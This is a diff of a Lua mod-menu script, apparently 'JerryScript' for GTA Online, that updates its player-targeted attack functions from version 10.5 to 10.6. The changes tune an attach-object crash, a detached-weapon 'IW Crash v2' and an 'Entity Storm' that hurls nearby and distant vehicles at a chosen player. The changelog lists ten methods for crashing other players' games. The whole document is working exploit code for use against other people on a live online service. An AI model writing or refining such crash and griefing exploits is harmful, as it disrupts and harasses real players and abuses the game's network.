@@ -29,7 +29,7 @@
 -- SCRIPT INFO
 -- ═══════════════════════════════════════════════════════════════════════════
 local SCRIPT_NAME = "JerryScript"
-local SCRIPT_VERSION = "10.5"
+local SCRIPT_VERSION = "10.6"
 
 -- ═══════════════════════════════════════════════════════════════════════════
 -- CLEANUP ON RELOAD
@@ -586,8 +586,8 @@ local function CloneCrash(pid)
 end
 
 -- ═══════════════════════════════════════════════════════════════════════════
--- ATTACH CRASH - Attach many entities with invalid params (like IW but objects)
--- Uses same pattern as working IW crash
+-- ATTACH CRASH - Attach many entities to target (like IW pattern)
+-- Spawns objects at target position and attaches to their bones
 -- ═══════════════════════════════════════════════════════════════════════════
 
 local function AttachCrash(pid)
@@ -600,11 +600,11 @@ local function AttachCrash(pid)
     local px, py, pz = getPlayerCoords(pid)
     if not px then return end
     
-    -- Objects that can cause issues when attached
+    -- Small objects that work well for attachment
     local crashObjects = {
         Utils.Joaat("prop_beach_volball02"),
-        Utils.Joaat("prop_bowling_ball"),
         Utils.Joaat("prop_cs_dildo_01"),
+        Utils.Joaat("prop_drug_package"),
     }
     
     local objs = {}
@@ -616,34 +616,37 @@ local function AttachCrash(pid)
         for _, mdl in ipairs(crashObjects) do
             requestModel(mdl)
         end
-        Script.Yield(100)
+        Script.Yield(200)
         
-        -- Spawn and attach objects to target's bones
+        -- Bone IDs for ped
         local bones = {0, 31086, 6286, 28252, 60309, 24818, 64729, 40269, 45509, 58271}
         
-        for i = 1, 20 do
+        -- Spawn and attach objects
+        for i = 1, 15 do
             local mdl = crashObjects[(i % #crashObjects) + 1]
             local bone = bones[(i % #bones) + 1]
             
             pcall(function()
-                local obj = GTA.CreateObject(mdl, px, py, pz + 50, true, true)
+                -- Spawn at target position
+                local obj = GTA.CreateObject(mdl, px, py, pz, true, true)
                 if obj and obj ~= 0 then
                     table.insert(objs, obj)
                     table.insert(State.spawnedEntities, obj)
                     
+                    Script.Yield(20)
                     requestControlOfEntity(obj)
                     
-                    -- Attach to target with random offsets
-                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, obj, targetPed, bone,
-                        (math.random() - 0.5) * 2, (math.random() - 0.5) * 2, (math.random() - 0.5) * 2,
-                        math.random() * 360, math.random() * 360, math.random() * 360,
-                        false, false, false, true, 0, true)
-                    
-                    -- Make invisible
+                    -- Make invisible first
                     Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, obj, false)
+                    
+                    -- Attach to target with offset
+                    Natives.InvokeVoid(N.ATTACH_ENTITY_TO_ENTITY, obj, targetPed, bone,
+                        (math.random() - 0.5), (math.random() - 0.5), (math.random() - 0.5),
+                        0, 0, 0,
+                        false, false, false, false, 0, true)
                 end
             end)
-            Script.Yield(30)
+            Script.Yield(50)
         end
         
         -- Release models
@@ -651,16 +654,16 @@ local function AttachCrash(pid)
             NoLongerNeeded(mdl)
         end
         
-        Script.Yield(3000)
+        toast(SCRIPT_NAME, "Attach Crash sent! (15 objects)")
         
-        -- Clean up
+        Script.Yield(5000)
+        
+        -- Clean up after 5 seconds
         for _, obj in ipairs(objs) do
             pcall(function()
                 betterDelete(obj, true)
             end)
         end
-        
-        toast(SCRIPT_NAME, "Attach Crash sent!")
     end)
 end
 
@@ -725,8 +728,8 @@ local function VehicleAttachCrash(pid)
 end
 
 -- ═══════════════════════════════════════════════════════════════════════════
--- INFINITE WEAPON CRASH - Spam weapon entity detach (enhanced IW)
--- Same principle as IW but more aggressive
+-- INFINITE WEAPON CRASH v2 - Enhanced IW but SAFE (won't crash your game)
+-- Spawns peds FAR from you, teleports them to target, does the crash
 -- ═══════════════════════════════════════════════════════════════════════════
 
 local function InfiniteWeaponCrash(pid)
@@ -736,90 +739,89 @@ local function InfiniteWeaponCrash(pid)
         return 
     end
     
-    local heading = 0
-    pcall(function()
-        local targetPed = getPlayerPed(pid)
-        if targetPed then
-            heading = Natives.InvokeFloat(N.GET_ENTITY_HEADING, targetPed)
-        end
-    end)
+    -- Get our coords to spawn peds FAR from us
+    local myX, myY, myZ = getLocalPlayerCoords()
+    if not myX then return end
     
-    -- Use multiple ped models and weapons for more variety
+    -- Spawn location - far from both us and target (in the sky above target)
+    local spawnX = px
+    local spawnY = py + 100  -- 100m north of target
+    local spawnZ = pz + 50   -- 50m up
+    
     local pedModels = {
         Utils.Joaat("cs_tenniscoach"),
         Utils.Joaat("a_m_m_bevhills_01"),
-        Utils.Joaat("s_m_y_cop_01"),
     }
     
     local weapons = {
         WEAPON_RPG,
         Utils.Joaat("WEAPON_MINIGUN"),
-        Utils.Joaat("WEAPON_RAILGUN"),
-        Utils.Joaat("WEAPON_GRENADELAUNCHER"),
     }
     
     local peds = {}
     
     Script.QueueJob(function()
-        toast(SCRIPT_NAME, "Infinite Weapon Crash executing...")
+        toast(SCRIPT_NAME, "IW Crash v2 executing (safe mode)...")
         
-        -- Load all models
+        -- Load models
         for _, mdl in ipairs(pedModels) do
             requestModel(mdl)
         end
         Script.Yield(100)
         
-        -- Spawn 20 peds with various weapons
-        for i = 1, 20 do
+        -- Spawn 10 peds (reduced from 20 for stability)
+        for i = 1, 10 do
             local mdl = pedModels[(i % #pedModels) + 1]
             local weapon = weapons[(i % #weapons) + 1]
             
             pcall(function()
-                local ped = GTA.CreatePed(mdl, 2, px, py + 60, pz, heading, true, true)
+                -- Spawn far from us in the sky
+                local ped = GTA.CreatePed(mdl, 2, spawnX, spawnY + (i * 2), spawnZ, 0, true, true)
                 if doesEntityExist(ped) then
                     table.insert(peds, {ped = ped, weapon = weapon})
                     table.insert(State.spawnedEntities, ped)
+                    -- Make invisible immediately
+                    Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false)
                 end
             end)
-            Script.Yield(30)
+            Script.Yield(50)
         end
         
-        Script.Yield(50)
+        Script.Yield(100)
         
-        -- Process each ped
+        -- Now teleport each ped to target and do the IW crash
         for _, data in ipairs(peds) do
             local ped = data.ped
             local weapon = data.weapon
             
             pcall(function()
+                if not doesEntityExist(ped) then return end
+                
                 requestControlOfEntity(ped)
-                -- Teleport to target
+                -- Teleport to target position
                 Natives.InvokeVoid(N.SET_ENTITY_COORDS_NO_OFFSET, ped, px, py, pz, false, false, false)
-                -- Make invisible
-                Natives.InvokeVoid(N.SET_ENTITY_VISIBLE, ped, false)
                 -- Give weapon
                 Natives.InvokeVoid(N.GIVE_DELAYED_WEAPON_TO_PED, ped, weapon, 9999, true)
                 Natives.InvokeVoid(N.SET_CURRENT_PED_WEAPON, ped, weapon, true)
-                -- Set as gadget
                 Natives.InvokeVoid(N.SET_PED_GADGET, ped, weapon, true)
             end)
-            Script.Yield(20)
+            Script.Yield(30)
             
             -- Detach weapon (the crash vector)
             pcall(function()
+                if not doesEntityExist(ped) then return end
                 local gadget = Natives.InvokeInt(N.GET_CURRENT_PED_WEAPON_ENTITY_INDEX, ped, 0)
                 if gadget and gadget ~= 0 then
                     Natives.InvokeVoid(N.DETACH_ENTITY, gadget, true, true)
-                    -- Also try to delete it immediately
-                    Natives.InvokeVoid(N.SET_ENTITY_AS_MISSION_ENTITY, gadget, true, true)
-                    Natives.InvokeVoid(N.DELETE_ENTITY, gadget)
                 end
             end)
-            Script.Yield(15)
+            Script.Yield(20)
             
             -- Kill ped
             pcall(function()
-                Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
+                if doesEntityExist(ped) then
+                    Natives.InvokeVoid(N.SET_ENTITY_HEALTH, ped, 0, 0)
+                end
             end)
         end
         
@@ -838,7 +840,7 @@ local function InfiniteWeaponCrash(pid)
             NoLongerNeeded(mdl)
         end
         
-        toast(SCRIPT_NAME, "Infinite Weapon Crash sent!")
+        toast(SCRIPT_NAME, "IW Crash v2 sent!")
     end)
 end
 
@@ -2326,9 +2328,9 @@ local function EntityYeet(pid)
 end
 
 -- ═══════════════════════════════════════════════════════════════════════════
--- ENTITY STORM - Continuous vehicle swarm attacking player (JerryScript style)
--- Grabs ALL vehicles from pool and applies continuous force toward target
--- No teleporting - just relentless swarming from wherever vehicles are
+-- ENTITY STORM - JERRY SCRIPT STYLE - ABSOLUTELY INSANE VEHICLE SWARM
+-- Grabs ALL vehicles from pool and sends them FLYING at target continuously
+-- This is the crazy mode - vehicles launch into the air and swarm like bees
 -- ═══════════════════════════════════════════════════════════════════════════
 
 local function EntityStorm(pid)
@@ -2336,8 +2338,6 @@ local function EntityStorm(pid)
     if not targetX then return end
     
     local mult = YeetSettings.multiplier
-    local swarmCount = 0
-    local maxPerTick = 8  -- Process max 8 vehicles per tick to prevent crash
     
     -- Get my vehicle to exclude
     local myPed = getLocalPlayerPed()
@@ -2346,65 +2346,73 @@ local function EntityStorm(pid)
         myVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, myPed, false) or 0
     end
     
-    -- Get target's vehicle to avoid swarming their own car
+    -- Get target's vehicle
     local targetPed = getPlayerPed(pid)
     local targetVeh = 0
     if targetPed and Natives.InvokeBool(N.IS_PED_IN_ANY_VEHICLE, targetPed, true) then
         targetVeh = Natives.InvokeInt(N.GET_VEHICLE_PED_IS_IN, targetPed, false) or 0
     end
     
-    -- Use rendered vehicles for stability (nearby vehicles)
+    -- PHASE 1: Rendered vehicles (nearby) - These get VIOLENT force toward target
     local vehicles = PoolMgr.GetRenderedVehicles()
-    if not vehicles then return end
-    
-    local processed = 0
-    for _, vehObj in pairs(vehicles) do
-        if processed >= maxPerTick then break end
-        
-        pcall(function()
-            local handle = GTA.PointerToHandle(vehObj)
-            if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
-                local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
-                if vx then
-                    local dx = targetX - vx
-                    local dy = targetY - vy
-                    local dz = targetZ - vz
-                    local distSq = dx*dx + dy*dy + dz*dz
-                    
-                    -- Only affect vehicles within 200m but more than 5m away
-                    if distSq < 40000 and distSq > 25 then
-                        if requestControlOfEntity(handle) then
-                            local dist = math.sqrt(distSq)
-                            local towardX = dx / dist
-                            local towardY = dy / dist
-                            local towardZ = dz / dist
-                            
-                            -- Strong force toward target + slight upward to clear obstacles
-                            local forceX = towardX * mult * 8
-                            local forceY = towardY * mult * 8
-                            local forceZ = mult * 3 + 2  -- Upward bias
-                            
-                            Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
-                                forceX, forceY, forceZ, true, false, true, true)
-                            
-                            swarmCount = swarmCount + 1
-                            processed = processed + 1
+    if vehicles then
+        for _, vehObj in pairs(vehicles) do
+            pcall(function()
+                local handle = GTA.PointerToHandle(vehObj)
+                if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
+                    local vx, vy, vz = Natives.InvokeV3(N.GET_ENTITY_COORDS, handle, true)
+                    if vx then
+                        local dx = targetX - vx
+                        local dy = targetY - vy
+                        local dz = targetZ - vz
+                        local distSq = dx*dx + dy*dy + dz*dz
+                        
+                        -- Affect vehicles 5m - 300m away
+                        if distSq < 90000 and distSq > 25 then
+                            if requestControlOfEntity(handle) then
+                                local dist = math.sqrt(distSq)
+                                local towardX = dx / dist
+                                local towardY = dy / dist
+                                local towardZ = dz / dist
+                                
+                                -- INSANE force - launch vehicles into air toward target
+                                -- Closer = less force (so they orbit), farther = more force (so they fly in)
+                                local distFactor = math.min(dist / 50, 3.0)  -- 0-3x multiplier based on distance
+                                local forceX = towardX * mult * 20 * distFactor
+                                local forceY = towardY * mult * 20 * distFactor
+                                local forceZ = mult * 15 + math.random(5, 15)  -- Strong upward + randomness
+                                
+                                -- Add swirl effect (perpendicular force for circular motion)
+                                local swirlX = -towardY * mult * 5
+                                local swirlY = towardX * mult * 5
+                                
+                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
+                                    forceX + swirlX, forceY + swirlY, forceZ, 
+                                    true, false, true, true)
+                                
+                                -- Also add some rotation for chaos
+                                Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY, handle, 1,
+                                    (math.random() - 0.5) * mult * 5,
+                                    (math.random() - 0.5) * mult * 5,
+                                    0,
+                                    (math.random() - 0.5) * 2,
+                                    (math.random() - 0.5) * 2,
+                                    (math.random() - 0.5) * 2,
+                                    0, false, false, true, false, true)
+                            end
                         end
                     end
                 end
-            end
-        end)
+            end)
+        end
     end
     
-    -- Also pull in vehicles from the full pool (farther away)
-    -- But limit to just a few per tick
-    if processed < maxPerTick then
-        local totalVehicles = PoolMgr.GetCurrentVehicleCount() or 0
-        local startIdx = math.random(0, math.max(0, totalVehicles - 10))
-        
-        for i = startIdx, math.min(startIdx + 5, totalVehicles - 1) do
-            if processed >= maxPerTick then break end
-            
+    -- PHASE 2: Sample from FULL vehicle pool (gets faraway vehicles too)
+    local totalVehicles = PoolMgr.GetCurrentVehicleCount() or 0
+    if totalVehicles > 0 then
+        -- Process 10 random vehicles from the pool each tick
+        for attempt = 1, 10 do
+            local i = math.random(0, totalVehicles - 1)
             pcall(function()
                 local handle = PoolMgr.GetVehicle(i)
                 if handle and handle ~= 0 and handle ~= myVeh and handle ~= targetVeh then
@@ -2415,20 +2423,19 @@ local function EntityStorm(pid)
                         local dz = targetZ - vz
                         local distSq = dx*dx + dy*dy + dz*dz
                         
-                        -- Farther vehicles (200m - 500m) get stronger pull
-                        if distSq > 40000 and distSq < 250000 then
+                        -- Far vehicles (100m - 1000m) get MASSIVE force to bring them in
+                        if distSq > 10000 and distSq < 1000000 then
                             if requestControlOfEntity(handle) then
                                 local dist = math.sqrt(distSq)
                                 local towardX = dx / dist
                                 local towardY = dy / dist
                                 
-                                -- Strong horizontal pull + big upward force
+                                -- MASSIVE horizontal pull + huge upward force (makes them fly in from distance)
                                 Natives.InvokeVoid(N.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS, handle, 1,
-                                    towardX * mult * 15, towardY * mult * 15, mult * 8,
+                                    towardX * mult * 40, 
+                                    towardY * mult * 40, 
+                                    mult * 25,  -- Launch them HIGH
                                     true, false, true, true)
-                                
-                                swarmCount = swarmCount + 1
-                                processed = processed + 1
                             end
                         end
                     end
@@ -2605,7 +2612,7 @@ Script.RegisterLooped(function()
     Script.Yield(0)  -- Every frame for smoothest force
 end)
 
--- Entity Storm tick - continuous swarm attack (JerryScript style)
+-- Entity Storm tick - continuous swarm attack (JerryScript style) - FAST!
 Script.RegisterLooped(function()
     for playerId, active in pairs(State.entityStormTargets) do
         if active then
@@ -2614,7 +2621,7 @@ Script.RegisterLooped(function()
             end)
         end
     end
-    Script.Yield(150)  -- Every 150ms for continuous swarm effect
+    Script.Yield(50)  -- Every 50ms for INTENSE continuous swarm effect
 end)
 
 -- Earthquake tick
@@ -3263,13 +3270,6 @@ ClickGUI.AddPlayerTab("JerryScript", function()
             ImGui.EndTabItem()
         end
         
-        -- ═══ CHAOS TAB ═══
-        if ImGui.BeginTabItem("Chaos") then
-            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityYeet"), pid)
-            ClickGUI.RenderFeature(Utils.Joaat("JS_PEntityStorm"), pid)
-            ImGui.EndTabItem()
-        end
-        
         ImGui.EndTabBar()
     end
 end)
@@ -3342,16 +3342,14 @@ end)
 log("═══════════════════════════════════════════════════════════════")
 log(" " .. SCRIPT_NAME .. " v" .. SCRIPT_VERSION .. " - DOLOS EDITION")
 log("═══════════════════════════════════════════════════════════════")
-log(" NEW IN 10.5:")
-log("   ✓ ENTITY-BASED CRASHES (like IW - actually work!)")
-log("   ✓ IW Crash v2 - Multi-weapon enhanced version")
-log("   ✓ Attach Crash - 20 objects on bones")
-log("   ✓ Vehicle Attach - 5 tanks attached")
-log("   ✓ Ragdoll Spam - 30 physics peds")
-log("   ✓ Particle Crash - 100 PTFX effects")
-log("   ✓ Net Object Spam - 50 networked objects")
-log("   ✓ 10 Total crash methods!")
-log(" All crashes use entity manipulation (not TSE)")
+log(" FIXES IN 10.6:")
+log("   ✓ IW Crash v2 - Now SAFE (won't crash your game)")
+log("   ✓ Entity Storm - INSANE swirl + launch effect!")
+log("   ✓ Removed duplicate Chaos tab")
+log("   ✓ Attach Crash - Fixed spawn location")
+log("   ✓ Faster Entity Storm tick (50ms)")
+log(" CRASH METHODS: IW, IWv2, Clone, Attach, VehAttach,")
+log("   Ragdoll, Particle, Cage, NetObj, GlitchBomb")
 log("═══════════════════════════════════════════════════════════════")
 
-GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - ENTITY CRASHES! ☢️", 4000, eToastPos.TopRight)
+GUI.AddToast(SCRIPT_NAME, "v" .. SCRIPT_VERSION .. " - STORM FIXED! 🌪️", 4000, eToastPos.TopRight)
